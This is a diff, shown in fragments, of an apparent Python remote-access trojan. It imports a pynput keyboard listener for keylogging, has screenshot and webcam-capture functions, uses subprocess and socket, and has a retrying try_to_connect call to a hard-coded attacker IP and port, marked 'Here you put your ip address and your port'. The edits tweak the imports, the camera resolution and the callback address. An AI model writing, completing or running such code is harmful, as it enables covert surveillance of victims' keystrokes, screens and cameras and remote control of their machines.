@@ -1,4 +1,5 @@
-import socket,subprocess,threading,pygame,pyscreenshot,datetime,re,pygame.camera
+import socket, subprocess, threading, datetime, re, os
+import pygame, pygame.camera
 from pynput.keyboard import Listener
 
 def send_data_to_process(process,data):
@@ -26,7 +27,7 @@ def screenshot():
     return filename
 
 def cam_capture(cam_id):
-    cam = pygame.camera.Camera(cam_id,(1280,720))
+    cam = pygame.camera.Camera(cam_id,(640,480))
     cam.start()
     image = cam.get_image()
     date= datetime.datetime.now().strftime("%d-%m-%Y %H-%M-%S")
@@ -108,4 +109,4 @@ def try_to_connect(ip,port):
     except:
         try_to_connect(ip,port)
 
-try_to_connect("192.168.0.16",4444) #Here you put your ip address and your port
+try_to_connect("192.168.0.209",4446) #Here you put your ip address and your port
